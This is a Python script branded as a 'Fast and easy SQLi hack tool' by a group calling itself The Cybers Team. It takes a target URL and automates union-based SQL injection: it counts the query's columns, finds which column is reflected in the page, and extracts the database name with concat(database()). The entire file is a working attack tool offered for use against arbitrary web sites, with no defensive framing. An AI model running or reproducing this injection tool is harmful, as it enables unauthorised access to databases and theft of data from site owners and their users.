import urllib as cybers
import sys
import os
import platform

if platform.system()=="Windows":
    os.system('cls')
else:
    os.system('clear')

header="""
____ _              ___      _                     _____                      
/__   \ |__   ___    / __\   _| |__   ___ _ __ ___  /__   \___  __ _ _ __ ___  
  / /\/ '_ \ / _ \  / / | | | | '_ \ / _ \ '__/ __|   / /\/ _ \/ _` | '_ ` _ \ 
 / /  | | | |  __/ / /__| |_| | |_) |  __/ |  \__ \  / / |  __/ (_| | | | | | |
 \/   |_| |_|\___| \____/\__, |_.__/ \___|_|  |___/  \/   \___|\__,_|_| |_| |_|
                         |___/                                                 

More: https://www.facebook.com/TheCybersTeam
Fast and easy SQLi hack tool Beta 0.7
"""
print header

for k, v in enumerate(sys.argv):
    if v == "-url":
        try:
            u = sys.argv[k+1]
            pos = u.find("=")
            url = u[:pos+1]
        except:
            pass

print "Url: "+u
print "\n"

def getContent(url):
    res = cybers.urlopen(url)
    return res.read()

def status(i):
    sys.stdout.write("\rColumns: {0}".format(i))

def countColumns(url):
    key = "Th3Cyb3rsT34m"
    print "Start Count Columns..."
    url = url + "-1 union select "
    start = 1
    finish = 50

    for i in range(start,finish):
        status(i)
        if i != start and i != finish:
            url = url + ", "

        url = url + "'"+key+"'"
        res = getContent(url)

        if res.find(key) !=-1:
            return i
            break
    return 0

columns = countColumns(url)

def getVulColumns(columns, url):
    key = "Th3Cyb3rsT34m"
    inject = "666Th3Cyb3rsTeam666"
    for i in range(1, columns+1):
        line = "-1 union select "
        for j in range(1, columns+1):
            if j != 1 and j != columns+1:
                line = line + ", "

            if i == j:
                line+="'"+inject+"'"
            else:
                line+="'"+key+"'"

        res = getContent(url + line)
        if res.find(inject) !=-1:
            return i
            break
    return 0

vulCol = getVulColumns(columns,url)
print "\nVul Column: " +str(vulCol)

def getVars(content):
    pos = content.find("'#")
    if(pos != -1):      
        ini = content[pos+2:]
        pos = ini.find("#'")
        return ini[:pos]

def getDatabase(vulCol,columns,url):
    url = url + "-1 union select "
    for i in range(1, columns+1):
        if i != 1 and i != columns+1:
            url = url + ", "
        if i == vulCol:
            url = url + "concat(0x27,0x23,database(),0x23,0x27)"
        else:
            url = url + str(i)

    res = getContent(url)
    return getVars(res)

database = getDatabase(vulCol,columns,url)
print "Database: "+database


